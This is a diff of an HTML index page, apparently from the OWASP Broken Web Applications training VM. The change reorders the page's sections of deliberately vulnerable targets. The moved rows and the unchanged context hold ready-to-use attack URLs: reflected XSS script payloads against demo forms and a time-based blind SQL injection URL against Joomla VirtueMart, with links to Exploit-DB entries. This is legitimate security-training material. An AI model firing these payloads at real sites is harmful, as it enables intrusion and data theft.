@@ -23,23 +23,8 @@
 	<tr><th>Severity</th><th>Type</th><th>Link To Vulnerability or Page</th></tr>
 </table>
 <p>
-<h2>Demonstration Pages/Small Applications</h2>
-<table>
-<tr><th><a name="CSRFGuard"></a>OWASP CSRFGuard Test Application</th></tr>
-	<tr><th>Severity</th><th>Type</th><th>Link To Vulnerability or Page</th></tr>
-<tr><th><a name="MandiantStruts"></a>Mandiant Struts Forms</th></tr>
-	<tr><th>Severity</th><th>Type</th><th>Link To Vulnerability or Page</th></tr>
-	<tr><td>Medium</td><td><a href="https://www.owasp.org/index.php/Cross_Site_Scripting_Flaw">Reflected XSS</a></td><td><a href="http://owaspbwa/mandiant-struts-form-vulnerable/submitname.do?name=%3Cscript%3Ealert%28'Example%20of%20Reflected%20XSS%20in%20Mandiant%20Struts%20Form'%29%3C/script%3E&submit=Submit">http://owaspbwa/mandiant-struts-form-vulnerable/submitname.do?name=%3Cscript%3Ealert%28'Example%20of%20Reflected%20XSS%20in%20Mandiant%20Struts%20Form'%29%3C/script%3E&submit=Submit</a></td>
-<tr><th><a name="ASPForms"></a>Simple ASP.NET Forms</th></tr>
-	<tr><th>Severity</th><th>Type</th><th>Link To Vulnerability or Page</th></tr>
-	<tr><td>Medium</td><td><a href="https://www.owasp.org/index.php/Cross_Site_Scripting_Flaw">Reflected XSS</a></td><td><a href="http://owaspbwa/mono/simple-reflected-xss.aspx?name=Chuck%3Cscript%3Ealert%281%29%3C/script%3E">http://owaspbwa/mono/simple-reflected-xss.aspx?name=Chuck%3Cscript%3Ealert%281%29%3C/script%3E</a></td></tr>
-<tr><th><a name="DOMXSS"></a>Simple Form with DOM Cross Site Scripting</th></tr>
-	<tr><th>Severity</th><th>Type</th><th>Link To Vulnerability or Page</th></tr>
-</table>
 
-<p>
-
-<h2>Web App Scanner Targets</h2>
+<h2>Realistic, Intentionally Vulnerable Applications</h2>
 <table>
 <tr><th><a name="Vicnum"></a>OWASP Vicnum</th></tr>
 <tr><th>Severity</th><th>Type</th><th>Link To Vulnerability or Page</th></tr>
@@ -54,7 +39,6 @@
 </table>
 
 <p>
-
 <h2>Old (Vulnerable) Versions of Real Applications</h2>
 <table>
 <tr><th><a name="WordPress"></a>WordPress</th></tr>
@@ -122,6 +106,21 @@
 	                                                                                                                      False Statement (Quick Load): <a href="http://owaspbwa/joomla/index.php?option=com_virtuemart&page%3d-1'+UnIOn+seLEcT+iF(ascii(substring(@@version,1,1))=52,benchmark(5000000,MD5('x')),NULL)--+junk.page&vmcchk=1&Itemid=5">http://owaspbwa/joomla/index.php?option=com_virtuemart&page%3d-1'+UnIOn+seLEcT+iF(ascii(substring(@@version,1,1))=52,benchmark(5000000,MD5('x')),NULL)--+junk.page&vmcchk=1&Itemid=5</a><br>Reference: <a href="http://www.exploit-db.com/exploits/17132/">http://www.exploit-db.com/exploits/17132/</a></a></td></tr>
 	<tr><td>High (plugin)</td><td><a href="https://www.owasp.org/index.php/Command_injection">Command Injection</a></td><td>Reference: <a href="http://www.exploit-db.com/exploits/16246/">http://www.exploit-db.com/exploits/16246/</a> <p><div class="warning">The exploit linked is destructive, and post exploitation will cause all Joomla pages to contain code to appear at the top.</div></p></td></tr>
 <tr><th><a name="awstats">AWStats</th></tr>
+	<tr><th>Severity</th><th>Type</th><th>Link To Vulnerability or Page</th></tr>
+</table>
+
+<p>
+<h2>Demonstration Pages/Small Applications</h2>
+<table>
+<tr><th><a name="CSRFGuard"></a>OWASP CSRFGuard Test Application</th></tr>
+	<tr><th>Severity</th><th>Type</th><th>Link To Vulnerability or Page</th></tr>
+<tr><th><a name="MandiantStruts"></a>Mandiant Struts Forms</th></tr>
+	<tr><th>Severity</th><th>Type</th><th>Link To Vulnerability or Page</th></tr>
+	<tr><td>Medium</td><td><a href="https://www.owasp.org/index.php/Cross_Site_Scripting_Flaw">Reflected XSS</a></td><td><a href="http://owaspbwa/mandiant-struts-form-vulnerable/submitname.do?name=%3Cscript%3Ealert%28'Example%20of%20Reflected%20XSS%20in%20Mandiant%20Struts%20Form'%29%3C/script%3E&submit=Submit">http://owaspbwa/mandiant-struts-form-vulnerable/submitname.do?name=%3Cscript%3Ealert%28'Example%20of%20Reflected%20XSS%20in%20Mandiant%20Struts%20Form'%29%3C/script%3E&submit=Submit</a></td>
+<tr><th><a name="ASPForms"></a>Simple ASP.NET Forms</th></tr>
+	<tr><th>Severity</th><th>Type</th><th>Link To Vulnerability or Page</th></tr>
+	<tr><td>Medium</td><td><a href="https://www.owasp.org/index.php/Cross_Site_Scripting_Flaw">Reflected XSS</a></td><td><a href="http://owaspbwa/mono/simple-reflected-xss.aspx?name=Chuck%3Cscript%3Ealert%281%29%3C/script%3E">http://owaspbwa/mono/simple-reflected-xss.aspx?name=Chuck%3Cscript%3Ealert%281%29%3C/script%3E</a></td></tr>
+<tr><th><a name="DOMXSS"></a>Simple Form with DOM Cross Site Scripting</th></tr>
 	<tr><th>Severity</th><th>Type</th><th>Link To Vulnerability or Page</th></tr>
 </table>
 
